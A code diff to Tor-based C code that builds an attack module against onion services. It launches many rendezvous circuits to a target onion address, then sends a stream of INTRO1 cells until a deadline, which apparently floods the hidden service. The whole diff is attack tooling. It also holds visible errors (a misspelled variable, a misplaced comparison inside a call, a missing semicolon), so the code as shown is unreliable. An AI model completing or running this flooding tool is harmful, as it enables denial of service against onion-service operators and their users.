@@ -25,44 +25,48 @@
 static hs_rd_attack_t *attack_infos = NULL;
 
 hs_attack_stats hs_attack_entry_point(hs_attack_cmd_t cmd, char *onionaddress,
-    uint16_t nbr_circuits){
+    uint16_t nbr_circuits, time_t until){
   if (!attack_infos){
     attack_infos = (hs_rd_attack_t *) tor_malloc(sizeof(hs_rd_attack_t));
+    attack_infos->rendcircs = smartlist_new();
   }
   switch(cmd){
     case ESTABLISH_RDV:
       // Establish all rendezvous circuits
       if (init_rendezvous_circuits(nbr_circuits, onionaddress < 0)) {
+        return NULL;
       }
       if (init_intro_circuit(onionservice) < 0) {
-        // something bad happenned, exit
+        // something bad happenned
+        return NULL;
       }
       return attack_infos->stats;
       break;
-    case SEND_RD: break;
+    case SEND_RD: launch_attack(until); break;
     default: break;
   }
 }
 
 int init_rendezvous_circuits(uint16_t nbr_circuits, char *onionaddress) {
-
-  attack_infos->rendcircs = (origin_circuit_t*) tor_malloc(
-        nbr_circuits*sizeof(origin_circuit_t));
+  //XXX might loop infinitly => should return -1 if too much circ launch
+  // failed  (define 'too much' ? )
   int c = 0;
-  for (int i=0; i<nbr_circuits; i++) {
+  while (attack_info->rendcircs->num_used < nbr_circuits) {
     circ_info_t *rendcirc = (circ_info_t *) tor_malloc(sizeof(circ_info_t));
+    rendcirc->state = REND_CIRC_BUILDING;
     rendcirc->circ = circuit_launch(CIRCUIT_PURPOSE_C_ESTABLISH_REND,
         CIRCLAUNCH_IS_INTERNAL);
     if (rendcirc->circ) {
-      rendcirc->state = REND_CIRC_BUILDING;
       rendcirc->circ->rend_data =
         rend_data_client_create(onionaddress, NULL, NULL, REND_NO_AUTH);
       smartlist_add(attack_infos->rendcircs, rendcirc);
+    } else {
       c++;
+      tor_free(rendcirc);
+      if (c >= RETRY_THRESHOLD*nbr_circuits)
+        return -1;
     }
   }
-  if (c==0)
-    return -1;
   return 0;
 }
 
@@ -71,13 +75,21 @@ int init_rendezvous_circuits(uint16_t nbr_circuits, char *onionaddress) {
  * nbr_circuits different INTRO1 cells
  */
 
-int init_intro_circuit(){
+int init_intro_circuit(int retry){
+  int flags = CIRCLAUNCH_IS_INTERNAL | CIRCLAUNCH_ONEHOP_TUNNEL;
+
   attack_infos->circ_to_intro = (circ_info_t *) tor_malloc(
       sizeof(struct circ_info_t));
   attack_infos->circ_to_intro->circ = circuit_launch(CIRCUIT_PURPOSE_C_INTRODUCING,
        CIRCLAUNCH_IS_INTERNAL)
-  if (!attack_infos->circ_to_intro->circ)
-    return -1;
+  if (!attack_infos->circ_to_intro->circ){
+    if (retry < RETRY_THRESHOLD){
+      tor_free(attack_infos->circ_to_intro);
+      return init_intro_circuit(++retry);
+    }
+    else
+      return -1;
+  }
   attack_infos->circ_to_intro->state = INTRO_CIRC_BUILDING;
   return 0;
 }
@@ -119,7 +131,8 @@ void hs_attack_send_intro_cell_callback(origin_circuit_t *rendcirc){
     // todo
   }
  err:
-  
+  //tell controler what happens depending on retvals
+  control_event_hs_attack();
 
 }
 
